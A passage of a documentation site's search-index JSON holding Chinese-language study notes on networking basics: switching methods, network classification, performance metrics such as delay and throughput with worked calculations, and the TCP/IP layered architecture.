<p>\u7f3a\u70b9\uff1a\u5efa\u7acb\u8fde\u63a5\u65f6\u95f4\u957f\uff1b\u7ebf\u8def\u72ec\u5360\uff0c\u4f7f\u7528\u6548\u7387\u4f4e\uff1b\u7075\u6d3b\u5dee\uff0c\u96be\u4ee5\u89c4\u683c\u5316</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#message-switching","title":"\u62a5\u6587\u4ea4\u6362\uff08Message Switching\uff09","text":"<p>\u7535\u62a5\u901a\u8fc7\u62a5\u6587\u4ea4\u6362\uff0c\u4e86\u89e3</p> <p>\u4e0d\u9700\u8981\u5efa\u7acb\u8fde\u63a5\uff0c\u76f4\u63a5\u53d1\u9001\u62a5\u6587\u3002\u62a5\u6587\u7684\u957f\u5ea6\u6ca1\u6709\u9650\u5236\uff0c\u6240\u4ee5\u9700\u8981\u4e2d\u95f4\u4ea4\u6362\u673a\u6709\u8db3\u591f\u7684\u5b58\u50a8\u7a7a\u95f4</p> <p>\u4f18\u70b9\uff1a\u65e0\u9700\u5efa\u7acb\u8fde\u63a5\uff1b\u52a8\u6001\u5206\u914d\u7ebf\u8def\uff1b\u63d0\u9ad8\u7ebf\u8def\u53ef\u9760\u6027\uff1b\u63d0\u9ad8\u7ebf\u8def\u5229\u7528\u7387\uff1b\u63d0\u4f9b\u591a\u76ee\u6807\u670d\u52a1</p> <p>\u7f3a\u70b9\uff1a\u5f15\u8d77\u4e86\u8f6c\u53d1\u65f6\u5ef6\uff1b\u9700\u8981\u8f83\u5927\u5b58\u50a8\u7f13\u5b58\uff1b\u9700\u8981\u4f20\u8f93\u989d\u5916\u7684\u4fe1\u606f\u91cf\uff08\u76ee\u6807\u5730\u5740\u548c\u539f\u5730\u5740\u7b49\uff09</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#packet-switching","title":"\u5206\u7ec4\u4ea4\u6362\uff08Packet Switching\uff09\u91cd\u8981","text":"<p>\u901a\u5e38\u628a\u4fe1\u606f\u7684\u5168\u90e8\u6570\u636e\u79f0\u4e3a\u4e00\u4e2a\u62a5\u6587\u3002\u5148\u628a\u8f83\u957f\u7684\u62a5\u6587\u5206\u6210\u5f88\u5c0f\u7684\u957f\u5ea6\u76f8\u7b49\u7684\u6570\u636e\u6bb5\uff0c\u5728\u5934\u90e8\u52a0\u4e0a\u5fc5\u8981\u7684\u63a7\u5236\u4fe1\u606f\uff08\u53d1\u5230\u4ec0\u4e48\u5730\u65b9\uff0c\u5305\u7684\u5e8f\u53f7\uff09\uff0c\u5c31\u6784\u6210\u4e00\u4e2a\u5206\u7ec4\uff08\u5305\uff09</p> <p>\u5b9e\u9645\u53d1\u9001\u65f6\uff0c\u4ece\u6e90\u7ad9\u5230\u8fbe\u76ee\u7684\u7ad9\u8d70\u4e0d\u540c\u7684\u8def\u5f84\uff08\u4e0d\u540c\u7684\u8def\u7531\u5668\uff09\uff0c\u5206\u7ec4\u5230\u8fbe\u76ee\u7684\u7ad9\u7684\u987a\u5e8f\u4e0d\u4e00\u5b9a\u4e0e\u539f\u59cb\u987a\u5e8f\u76f8\u540c\u3002\u5b9e\u9645\u8fd8\u53ef\u80fd\u53d1\u751f\u5206\u7ec4\u4e22\u5931\uff08\u4e22\u5305\uff09\uff0c\u8bef\u7801\uff0c\u91cd\u590d\u7b49\u95ee\u9898\u3002\u63a5\u6536\u65b9\u63a5\u6536\u5206\u7ec4\u540e\uff0c\u8fd8\u539f\u539f\u59cb\u62a5\u6587\u3002</p> <ul> <li>\u53d1\u9001\u65b9\uff1a\u6784\u9020\u5206\u7ec4\uff0c\u53d1\u9001\u5206\u7ec4</li> <li>\u8def\u7531\u5668\uff1a\u7f13\u5b58\u5206\u7ec4\uff0c\u8f6c\u53d1\u5206\u7ec4</li> <li>\u63a5\u6536\u65b9\uff1a\u63a5\u6536\u5206\u7ec4\uff0c\u8fd8\u539f\u62a5\u6587</li> </ul> <p>\u4f18\u70b9\uff1a\u65e0\u9700\u5efa\u7acb\u8fde\u63a5\uff1b\u7ebf\u8def\u5229\u7528\u7387\u9ad8\uff1b\u7b80\u5316\u4e86\u5b58\u50a8\u7ba1\u7406\uff1b\u52a0\u901f\u4f20\u8f93\uff1b\u51cf\u5c11\u51fa\u9519\u7387\u548c\u91cd\u53d1\u6570\u636e\u91cf\uff1b\u907f\u514d\u8fc7\u957f\u7684\u62a5\u6587\u957f\u65f6\u95f4\u5360\u7528\u94fe\u8def\uff0c\u6709\u5229\u4e8e\u8fdb\u884c\u5dee\u9519\u63a7\u5236\u3002</p> <p>\u7f3a\u70b9\uff1a\u5f15\u8d77\u4e86\u8f6c\u53d1\u65f6\u5ef6\uff1b\u9700\u8981\u4f20\u8f93\u989d\u5916\u7684\u4fe1\u606f\u91cf\uff1b\u5bf9\u4e8e\u6570\u636e\u62a5\u670d\u52a1\uff0c\u5b58\u5728\u5931\u5e8f\u3001\u4e22\u5931\u6216\u8005\u91cd\u590d\u5206\u7ec4\u7684\u95ee\u9898\uff1b\u5bf9\u4e8e\u865a\u7535\u8def\u670d\u52a1\uff0c\u5b58\u5728\u547c\u53eb\u5efa\u7acb\u3001\u6570\u636e\u4f20\u8f93\u548c\u865a\u7535\u8def\u91ca\u653e\u4e09\u4e2a\u8fc7\u7a0b\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#14-","title":"1.4 \u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u5b9a\u4e49\u548c\u5206\u7c7b-\u4e86\u89e3","text":"<p>\u5b9a\u4e49\uff1a\u8ba1\u7b97\u673a\u7f51\u7edc\u6ca1\u6709\u901a\u7528\u7684\u7cbe\u786e\u7684\u5b9a\u4e49\u3002</p> <p>\u7b80\u5355\u5b9a\u4e49\uff1a\u4e92\u8fde\u7684\u81ea\u6cbb\u7684\u8ba1\u7b97\u673a\u96c6\u5408</p> <p>\u5e7f\u4e49\u7f51\u7edc\uff1a\u7531\u53ef\u7f16\u7a0b\u7684\u786c\u4ef6\uff08\u624b\u673a\uff09\u4e92\u8fde\uff0c\u53ef\u4ee5\u4f20\u9001\u4e0d\u540c\u7684\u6570\u636e\uff0c\u6216\u8005\u66f4\u5e7f\u6cdb\u7684\u5e94\u7528\uff08\u4e91\u8ba1\u7b97\uff0c\u4e0d\u4ec5\u4ec5\u4f20\u6570\u636e\uff09</p> <p>\u8ba1\u7b97\u673a\u7f51\u7edc\u5206\u7c7b</p> <ul> <li>\u6309\u7167\u4ea4\u6362\u6280\u672f\uff1a\u7535\u8def\u4ea4\u6362\u7f51\u7edc\uff1b\u62a5\u6587\u4ea4\u6362\u7f51\u7edc\uff1b\u5206\u7ec4\u4ea4\u6362\u7f51\u7edc</li> <li>\u4f7f\u7528\u8005\u5206\u7c7b\uff1a\u516c\u5171\u7f51\uff1b\u4e13\u7528\u7f51\uff08\u6821\u56ed\u7f51\u6216\u8005\u4f01\u4e1a\u7f51\uff09</li> <li>\u4f20\u8f93\u4ecb\u8d28\uff1a\u6709\u7ebf\u7f51\uff1b\u65e0\u7ebf\u7f51</li> <li>\u8986\u76d6\u8303\u56f4\uff08WAN LAN \u4e3b\u8981\uff09</li> <li>\u5e7f\u57df\u7f51\uff08WAN\uff09\uff1a\u56fd\u5bb6\u8303\u56f4\u7684\u7f51\u7edc\uff0c\u56e0\u7279\u7f51\u7684\u6838\u5fc3\u90e8\u5206\uff0c\u4e92\u8fdeMAN\u548cLAN</li> <li>\u57ce\u57df\u7f51\uff08MAN\uff09\uff1a\u57ce\u5e02\u5185\u90e8\u7f51\u7edc\uff0c\u4e92\u8fde\u5927\u91cf\u4f01\u4e1a\u6821\u56edLAN</li> <li>\u5c40\u57df\u7f51\uff08LAN\uff09\uff1a\u4f01\u4e1a\u6821\u56ed\u7f51\uff1a\u5fae\u673a\u6216\u8005\u5de5\u4f5c\u7ad9\u4e92\u8fde</li> <li> <p>\u4e2a\u57df\u7f51\uff08PAN\uff09\uff1a\u4e2a\u4eba\u7b14\u8bb0\u672c\u624b\u673a\u8033\u673a\u7f51\u7edc</p> </li> <li> <p>\u62d3\u6251\u7ed3\u6784\u5206\u7c7b\uff1a\u603b\u7ebf\u578b\uff1b\u661f\u578b\uff1b\u73af\u5f62\uff1b\u7f51\u72b6\u578b</p> </li> </ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#15-1-","title":"1.5 \u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u6027\u80fd\u6307\u6807\uff081\uff09-\u91cd\u70b9","text":"<p>\u9700\u8981\u8ba1\u7b97\uff0c\u8003\u7814\u4f1a\u51fa\u9898</p> <p>\u8ba1\u7b97\u673a\u7f51\u7edc8\u4e2a\u6027\u80fd\u6307\u6807\uff1a</p> <ul> <li>\u901f\u7387</li> <li>\u5e26\u5bbd</li> <li>\u541e\u5410\u91cf</li> <li>\u65f6\u5ef6</li> <li>\u65f6\u5ef6\u5e26\u5bbd\u79ef</li> <li>\u5f80\u8fd4\u65f6\u95f4</li> <li>\u5229\u7528\u7387</li> <li>\u4e22\u5305\u7387</li> </ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#-","title":"\u6bd4\u7279-\u8ba1\u7b97\u673a\u6570\u636e\u91cf\u5355\u4f4d","text":"<p>\u6700\u5c0f\u7684\u662f\u6bd4\u7279\uff0cbit\uff08\u7f29\u5199\u662f\u5c0fb\uff09\uff0c1Byte = 8bit\uff0c\u5927\u5199\u7684B\u662f Byte\uff0c\u5b57\u8282</p> <p>\u5728\u8ba1\u7b97\u673a\u4e2d\uff0cKB \u8868\u793a 2 \u768410\u6b21\u65b9 B</p> <p>\u5728\u786c\u76d8\u4f18\u76d8\u751f\u4ea7\u5382\u5bb6\u4e2d\uff0c\u7ed9\u51fa\u7684\u786c\u76d8\u5bb9\u91cf 250G\uff0c\u8868\u793a 250 * 10 \u76849\u6b21\u65b9\uff0c\u8fd9\u4e24\u4e2a\u8ba1\u7b97\u4e0d\u4e00\u6837</p> <p>\u9664\u4e86\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u6570\u636e\u91cf\u662f2\u8fdb\u5236\uff0c\u5176\u4ed6\u7684\u5382\u5bb6\uff0c\u901f\u7387\u5e26\u5bbd\u8ba1\u7b97\u90fd\u662f10\u6b21\u65b9\uff0c\u9700\u8981\u6ce8\u610f\u3002</p> <p>250 * (10 ^ 9) / (2 ^ 30) === 232.8 GB \u786c\u76d8\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u663e\u793a 232.8GB</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_4","title":"\u901f\u7387","text":"<p>\u901f\u7387\u662f\u8ba1\u7b97\u673a\u7f51\u7edc\u4e0a\u4e3b\u673a\u5728\u6570\u5b57\u4fe1\u9053\u4e0a\u4f20\u9001\u6bd4\u7279\u7684\u901f\u7387\uff0c\u4e5f\u6210\u4e3a\u6bd4\u7279\u7387\u6216\u8005\u6570\u636e\u7387\u3002</p> <p>\u81ea\u5df1\u7406\u89e3\uff1a\u5c31\u662f\u53d1\u9001\u6bd4\u7279\u7684\u901f\u7387</p> <p>\u5355\u4f4d: bit/s, kb/s Mb/s \u6ce8\u610f\u8fd9\u91cc\u7684b\u662f\u5c0f\u5199\u7684\uff0c\u662f\u4e00\u4e2abit</p> <p>\u4f8b\u9898\uff1a\u6570\u636e\u7684\u5927\u5c0f\u662f 100MB\uff0c\u7f51\u5361\u7684\u53d1\u9001\u901f\u7387\u662f 100 Mb/s\uff0c\u6c42\u7f51\u5361\u53d1\u9001\u7684\u65f6\u95f4</p> <ul> <li> <p>\u7cbe\u786e\u8ba1\u7b97\uff1a100MB / 100Mb/s = MB / Mb/s = 2 ^20 * 8b / 10 ^ 6 b/s  == 8.388 s</p> </li> <li> <p>\u4f30\u7b97\uff1a\u53ef\u4ee5\u62b5\u6d88M B/b/s == 8s </p> </li> </ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_5","title":"\u5e26\u5bbd","text":"<p>\u5728\u6a21\u62df\u4fe1\u53f7\u4e2d\uff08\u7535\u8bdd\uff09\u4e2d\uff0c\u901a\u4fe1\u7684\u533a\u6bb5\u662f 300Hz\u2014\u20143400Hz\uff0c\u90a3\u4e48\u5e26\u5bbd\u5c31\u662f 3.1KHz\uff08\u4e86\u89e3\uff09</p> <p>\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\uff0c\u8868\u793a\u6574\u4e2a\u901a\u4fe1\u7ebf\u8def\u4f20\u8f93\u6570\u636e\u7684\u80fd\u529b\u3002\u5728\u5355\u4f4d\u65f6\u95f4\u5185\u4ece\u7f51\u7edc\u7684\u67d0\u4e00\u70b9\u5230\u53e6\u4e00\u70b9\u80fd\u901a\u8fc7\u7684\u6700\u9ad8\u6570\u636e\u7387\uff0c\u5355\u4f4d\u548c\u901f\u7387\u4e00\u6837 b/s\u3002\u5e26\u5bbd\u662f\u6700\u9ad8\u6570\u636e\u7387\uff08\u7406\u8bba\u4e0a\u53ef\u4ee5\u8fbe\u5230\u7684\u6700\u9ad8\u901f\u7387\uff09</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_6","title":"\u541e\u5410\u91cf","text":"<p>\u541e\u5410\u91cf\uff1a\u5355\u4f4d\u65f6\u95f4\u5185\u901a\u8fc7\u67d0\u4e2a\u7f51\u7edc\uff08\u4fe1\u9053\uff0c\u63a5\u53e3\uff09\u7684\u6570\u636e\u91cf\u3002\u53d7\u7f51\u7edc\u7684\u8d37\u6b3e\u6216\u989d\u5b9a\u901f\u7387\u7684\u9650\u5236\u3002\u7ecf\u5e38\u7528\u4e8e\u663e\u793a\u4e16\u754c\u4e2d\u7f51\u7edc\u7684\u4e00\u79cd\u6d4b\u91cf\uff08\u5b9e\u9645\u5230\u5e95\u591a\u5c11\u6570\u636e\u80fd\u901a\u8fc7\u7f51\u7edc\uff09\u3002\u53ef\u80fd1Gb/s \u7684\u5e26\u5bbd\uff0c\u5b9e\u9645\u541e\u5410\u91cf\u5728 700Mb/s</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_7","title":"\u65f6\u5ef6","text":"<p>\u53d1\u9001\u65f6\u5ef6\uff1a\u8ba1\u7b97\u673a\u4e2d\u6570\u636e\u4ece\u7f51\u5361\u4e2d\u53d1\u9001\u7684\u65f6\u5ef6\uff0c\u7b49\u4e8e\u5206\u7ec4\u957f\u5ea6\uff08b\uff09/\u53d1\u9001\u901f\u7387(b/s)\u3002\u4e3b\u673a\u53d1\u9001\u901f\u7387 = Min(\u7f51\u5361\u53d1\u9001\u901f\u7387\uff0c\u4fe1\u9053\u5e26\u5bbd\uff0c\u63a5\u53e3\u901f\u7387)</p> <p>\u4f20\u64ad\u65f6\u5ef6\uff1a\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\uff0c\u6570\u636e\u4ece\u4e00\u4e2a\u8282\u70b9\u4f20\u64ad\u5230\u53e6\u4e00\u4e2a\u8282\u70b9\u7684\u65f6\u5ef6\uff0c\u7b49\u4e8e\u4fe1\u9053\u957f\u5ea6\uff08\u516c\u91cc\uff09/\u7535\u78c1\u6ce2\u7684\u4f20\u8f93\u901f\u5ea6\uff08\u7535\u78c1\u6ce2\u5728\u5149\u7ea4\u4e2d\u662f 2* 10 ^ 8\uff0c\u5728\u94dc\u7ebf\u4e2d\u662f 2.3\uff0c\u5728\u771f\u7a7a\u4e2d\u662f 3\uff09\u3002\u8ba1\u7b97\u4f20\u64ad\u65f6\u5ef6\uff0c\u5148\u786e\u5b9a\u4f7f\u7528\u4ec0\u4e48\u4f20\u8f93\u4ecb\u8d28\u3002</p> <p>\u5904\u7406\u65f6\u5ef6\uff1a\u8def\u7531\u5668\u96c6\u7ebf\u5668\u4e2d\u7b49\u5f85\u65f6\u95f4+\u8f6c\u53d1\u65f6\u95f4\uff0c\u548c\u8def\u7531\u5668\u7684\u8f6f\u786c\u4ef6\u6027\u80fd\u6709\u5173\uff0c\u5f71\u54cd\u56e0\u7d20\u6bd4\u8f83\u591a\uff0c\u4e00\u822c\u4e0d\u8ba1\u7b97\u3002\u5404\u7ea7\u8def\u7531\u5668\u7684\u7e41\u5fd9\u7a0b\u5ea6\u4e5f\u662f\u52a8\u6001\u53d8\u5316\u7684\u3002</p> <p>\u95ee\u9898\uff1a\u53d1\u9001\u65f6\u5ef6\u548c\u4f20\u64ad\u65f6\u5ef6\u54ea\u4e2a\u66f4\u591a\uff1f</p> <ul> <li> <p>\u4f20\u64ad\u65f6\u5ef6\u548c\u6570\u636e\u91cf\u5927\u5c0f\u65e0\u5173\u3002\u53d1\u9001\u65f6\u95f4\u548c\u6570\u636e\u91cf\u5927\u5c0f\u6709\u5173\u3002</p> </li> <li> <p>\u5982\u679c\u6570\u636e\u5757 100MB\uff0c\u4fe1\u9053\u5e26\u5bbd1Mb/s\uff0c\u53d1\u9001\u65f6\u5ef6\u7ea6 800s</p> </li> <li> <p>\u5982\u679c\u6570\u636e\u5757 1B\uff0c\u4fe1\u9053\u5e26\u5bbd 1Mb/s\uff0c\u53d1\u9001\u65f6\u5ef6\u53ea\u6709 8 * 10 ^ -6 s</p> </li> </ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#15-2","title":"1.5 \u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u6027\u80fd\u6307\u6807\uff082\uff09","text":""},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_8","title":"\u65f6\u5ef6\u5e26\u5bbd\u79ef","text":"<p>\u65f6\u5ef6\u5e26\u5bbd\u79ef= \u4f20\u64ad\u65f6\u5ef6 x \u5e26\u5bbd</p> <p>\u5982\u679c\u53d1\u9001\u6bb5\u8fde\u7eed\u53d1\u9001\u6570\u636e\uff0c\u5728\u7b2c\u4e00\u4e2a\u53d1\u9001\u7684\u6bd4\u7279\u5373\u5c06\u5230\u8fbe\u7ec8\u70b9\u65f6\uff0c\u53d1\u9001\u6bb5\u5df2\u7ecf\u53d1\u9001\u7684\u6bd4\u7279\uff0c\u5c31\u662f\u65f6\u5ef6\u5e26\u5bbd\u79ef\u3002\u94fe\u8def\u7684\u65f6\u5ef6\u5e26\u5bbd\u79ef\u53c8\u79f0\u4e3a\u4ee5\u6bd4\u7279\u4e3a\u5355\u4f4d\u7684\u94fe\u8def\u957f\u5ea6\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_9","title":"\u5f80\u8fd4\u65f6\u95f4","text":"<p>RTT \u53cc\u5411\u4ea4\u4e92\u4e00\u6b21\u6240\u9700\u7684\u65f6\u95f4\u3002\u5728\u5404\u79cd\u94fe\u8def\u4e2d\uff08\u6709\u7ebf\u7f51\uff0c\u65e0\u7ebf\u7f51\u7b49\uff09\uff0c\u536b\u661f\u94fe\u8def\u8017\u65f6\u8f83\u591a\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_10","title":"\u5229\u7528\u7387","text":"<p>\u4fe1\u9053\u5229\u7528\u7387\uff1a\u7528\u6765\u8868\u793a\u67d0\u4fe1\u9053\u6709\u767e\u5206\u4e4b\u51e0\u7684\u65f6\u95f4\u662f\u88ab\u5229\u7528\u7684\uff08\u6709\u6570\u636e\u901a\u8fc7\uff09\u3002</p> <p>\u7f51\u7edc\u5229\u7528\u7387\uff1a\u5168\u7f51\u7edc\u7684\u4fe1\u9053\u5229\u7528\u7387\u7684\u52a0\u6743\u5e73\u5747\u3002</p> <p>\u5229\u7528\u7387\u5e76\u4e0d\u662f\u8d8a\u9ad8\u8d8a\u597d\uff0c\u5982\u679c\u5229\u7528\u7387\u589e\u5927\u65f6\uff0c\u65f6\u5ef6\u4e5f\u4f1a\u8fc5\u901f\u589e\u52a0\u3002\u65f6\u5ef6\u8ba1\u7b97\u516c\u5f0f\uff1aD = Do/(1 - U)\u3002\u5f53\u7f51\u7edc\u5229\u7528\u7387\u8fbe\u523050%\u65f6\uff0c\u65f6\u5ef6\u52a0\u500d\u3002\u5f53\u5229\u7528\u7387\u8d85\u8fc750%\u65f6\uff0c\u5b9e\u9645\u65f6\u5ef6\u4f1a\u663e\u8457\u589e\u5927\u3002</p> <p>\u5229\u7528\u7387\u5e76\u4e0d\u662f\u8d8a\u4f4e\u8d8a\u597d\uff0c\u8fd9\u6837\u4f1a\u6d6a\u8d39\u901a\u4fe1\u8d44\u6e90\u3002\u5e94\u8be5\u6839\u636e\u60c5\u51b5\u52a8\u6001\u8c03\u6574\u8f93\u5165\u5230\u7f51\u7edc\u4e2d\u7684\u901a\u4fe1\u91cf\uff0c\u4f7f\u5f97\u7f51\u7edc\u5229\u7528\u7387\u4fdd\u6301\u5728\u5408\u7406\u7684\u8303\u56f4\u5185\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_11","title":"\u4e22\u5305\u7387","text":"<p>\u4e22\u5305\u7387\uff1a\u4e00\u5b9a\u65f6\u95f4\u8303\u56f4\u5185\uff0c\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e22\u5931\u7684\u5206\u7ec4\u6570\u91cf\u548c\u5168\u90e8\u5206\u7ec4\u6570\u91cf\u7684\u6bd4\u4f8b\u3002\u4e3b\u8981\u662f\u8fd0\u7ef4\u8d1f\u8d23\uff0c\u5ba2\u6237\u901a\u5e38\u4e0d\u4f1a\u610f\u8bc6\u5230\u4e22\u5305\u3002</p> <p>\u5206\u7ec4\u4e22\u5931\uff08\u4e22\u5305\uff09\u7684\u539f\u56e0\uff1a1\u3001\u5206\u7ec4\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u8bef\u7801\uff0c\u88ab\u8282\u70b9\u4e22\u5f03\uff1b2\u3001\u5f53\u901a\u4fe1\u91cf\u8f83\u5927\uff0c\u7f51\u7edc\u62e5\u5835\uff0c\u67d0\u4e2a\u5206\u7ec4\u4ea4\u6362\u673a\u5df2\u7ecf\u6ee1\u4e86\uff0c\u540e\u7eed\u5230\u8fbe\u7684\u5206\u7ec4\u53ef\u80fd\u88ab\u4e22\u5f03\u3002\u4e3b\u8981\u662f\u7b2c\u4e8c\u4e2a\u539f\u56e0\u3002</p> <p>\u4e22\u5305\u7387\u53cd\u6620\u4e86\u7f51\u7edc\u62e5\u5835\u7684\u60c5\u51b5\uff1a\u65e0\u62e5\u58350%\uff0c\u8f7b\u5ea6\u62e5\u58351%-4%\uff0c\u91cd\u5ea6\u62e5\u58355%-15%\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#16-1","title":"1.6 \u8ba1\u7b97\u673a\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784\uff081\uff09\u2014\u5e38\u89c1\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784","text":"<ul> <li>OSI \u4f53\u7cfb\u7ed3\u6784\uff08\u5f00\u653e\u7cfb\u7edf\u4e92\u8fde\u53c2\u8003\u6a21\u578b\uff09-\u6cd5\u5f8b\u4e0a\u7684\u56fd\u9645\u6807\u51c6\uff0c\u4e03\u5c42</li> <li>TCP/IP\u4f53\u7cfb\u7ed3\u6784-\u4ea7\u4e1a\u754c\u56fd\u9645\u6807\u51c6\uff0c\u56db\u5c42\uff08OSI \u7684\u5236\u5b9a\u4e13\u5bb6\u7f3a\u4e4f\u5b9e\u9645\u7ecf\u9a8c\uff0cOSI\u5b9e\u73b0\u8d77\u6765\u8fc7\u5206\u590d\u6742\uff0c\u5e76\u4e14\u8fd0\u884c\u6548\u7387\u5f88\u4f4e\uff1bOSI\u6807\u51c6\u5236\u5b9a\u7684\u5468\u671f\u592a\u957f\uff0cOSI\u5c42\u6b21\u5212\u5206\u4e0d\u592a\u5408\u7406\uff09\u3002\u5206\u522b\u662f\uff1a\u7f51\u7edc\u63a5\u53e3\u5c42\uff08\u7269\u7406\u5c42+\u6570\u636e\u94fe\u8def\u5c42\uff09\u3001\u7f51\u9645\u5c42\uff08IP\uff09\u3001\u8fd0\u8f93\u5c42\uff08TCP\uff09\u3001\u5e94\u7528\u5c42\uff08HTTP\uff09</li> </ul> <p>\u5b9e\u9645\u5b66\u4e60\u4e2d\uff0c\u5b66\u4e60\u7684\u662f TCP/IP \u7684\u56db\u5c42\u7ed3\u6784\u3002\u7b2c\u4e00\u5c42\u7f51\u7edc\u63a5\u53e3\u5c42\u5206\u6210 \u7269\u7406\u5c42 + \u6570\u636e\u94fe\u8def\u5c42\u8bb2\u3002</p> <p>\u6bcf\u4e00\u5c42\u90fd\u662f\u4e0d\u540c\u7684\u534f\u8bae\uff08\u901a\u4fe1\u6807\u51c6\uff09\u6784\u6210\u7684\u3002\u4e00\u4e2a\u8ba1\u7b97\u673a\u4e0a\u7684\u5e94\u7528\uff0c\u548c\u53e6\u4e00\u4e2a\u8ba1\u7b97\u673a\u4e0a\u7684\u5e94\u7528\u4e4b\u95f4\u901a\u4fe1\uff0c\u9700\u8981\u5148\u4ece\u9ad8\u7ea7\u5230\u4f4e\u7ea7\u9010\u6b65\u7f16\u7801\uff0c\u7136\u540e\u7ecf\u8fc7\u8ba1\u7b97\u673a\u7f51\u7edc\uff08\u8def\u7531\u5668\u4ea4\u6362\u673a\uff09\uff0c\u5230\u8fbe\u76ee\u6807\u8ba1\u7b97\u673a\uff0c\u7136\u540e\u518d\u81ea\u4e0b\u800c\u4e0a\u7684\u89e3\u7801\uff0c\u5b9e\u73b0\u4e86\u4e0d\u540c\u5e94\u7528\u4e4b\u95f4\u7684\u901a\u4fe1\u3002</p> <p>\u8ba1\u7b97\u673a\u901a\u5e38\u662f\u56db\u5c42\u5168\u90e8\u90fd\u6709\uff0c\u8def\u7531\u5668\u53ea\u6709\u7f51\u7edc\u63a5\u53e3\u5c42\u548c\u7f51\u9645\u5c42\uff08\u53ea\u9700\u8981\u5206\u7ec4\u8f6c\u53d1\uff0c\u4e0d\u9700\u8981\u4e0a\u5c42\u89e3\u6790\u6570\u636e\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u4e0a\u5c42\u7684\u534f\u8bae\uff09</p> <p>\u6700\u4e0b\u5c42\u7f51\u7edc\u63a5\u53e3\u5c42\uff08\u7269\u7406\u5c42\u548c\u6570\u636e\u94fe\u8def\u5c42\uff09\u901a\u5e38\u5df2\u7ecf\u94fa\u8bbe\u597d\uff0c\u4e0d\u9700\u8981\u6211\u4eec\u53bb\u76f4\u63a5\u8003\u8651\uff0c\u6240\u4ee5 TCP/IP \u4f53\u7cfb\u7ed3\u6784\u4e3b\u8981\u8003\u8651\u4e0a\u9762\u7684\u4e09\u5c42\uff08\u7f51\u9645\u5c42\uff0c\u8fd0\u8f93\u5c42\uff0c\u5e94\u7528\u5c42\uff09</p> <p>\u7f51\u9645\u5c42\uff1aIP \u534f\u8bae</p> <p>\u8fd0\u8f93\u5c42\uff1aTCP/UDP \u534f\u8bae</p> <p>\u5e94\u7528\u5c42\uff1aHTTP SMTP DNS RTP \u534f\u8bae</p> <p>IP \u534f\u8bae\u5bf9\u5e95\u5c42\u7684\u7f51\u7edc\u63a5\u53e3\u5c42\uff0c\u53ef\u4ee5\u5c06\u4e0d\u540c\u7684\u7f51\u7edc\u63a5\u53e3\u8fdb\u884c\u4e92\u8fde\uff0c\u540c\u65f6\u53ef\u4ee5\u4e3a\u4e0a\u5c42\u7684\u7f51\u7edc\u5e94\u7528\u63d0\u4f9b\u670d\u52a1\u3002\u6240\u4ee5 IP over everything, everything over IP\u3002</p> <p>\u8fd9\u4e00\u7cfb\u5217\u534f\u8bae\u79f0\u4e3a TCP/IP \u534f\u8bae\u65cf</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#16-2","title":"1.6 \u8ba1\u7b97\u673a\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784\uff082\uff09\u2014\u5206\u5c42\u7684\u5fc5\u8981\u6027","text":"<p>\u5206\u5c42\u7c7b\u4f3c\u4e8e\u529f\u80fd\u7ec4\u4ef6\u5316\uff0c\u53ef\u4ee5\u628a\u590d\u6742\u7684\u529f\u80fd\u62c6\u6210\u72ec\u7acb\u7684\u5c0f\u7684\u529f\u80fd\uff0c\u4e0d\u540c\u5c42\u5bf9\u5e94\u72ec\u7acb\u7684\u529f\u80fd\uff0c\u4fbf\u4e8e\u5206\u5f00\u6743\u9650\u548c\u540e\u671f\u7ef4\u62a4\u3002\u8ba1\u7b97\u673a\u7f51\u7edc\u662f\u975e\u5e38\u590d\u6742\u7684\u7cfb\u7edf\uff0c\u6240\u4ee5\u66f4\u9700\u8981\u5206\u5c42\u3002</p> <p>\u4e3b\u8981\u9762\u4e34\u7684\u95ee\u9898</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_12","title":"\u7269\u7406\u5c42","text":"<p>\u7269\u7406\u5c42\u89e3\u51b3\u4f7f\u7528\u4f55\u79cd\u4fe1\u53f7\u4f20\u8f93\u6bd4\u7279\u7684\u95ee\u9898</p> <ul> <li>\u4f7f\u7528\u4e0d\u540c\u7684\u4f20\u64ad\u5a92\u4f53\uff08\u7f51\u7ebf\uff0c\u65e0\u7ebf\u7f51\uff0c\u536b\u661f\u4fe1\u53f7\uff09</li> <li>\u4f7f\u7528\u4e0d\u540c\u7684\u7269\u7406\u63a5\u53e3</li> <li>\u4f7f\u7528\u4e0d\u540c\u7684\u7535\u4fe1\u53f7\u8868\u793a\u6bd4\u7279</li> 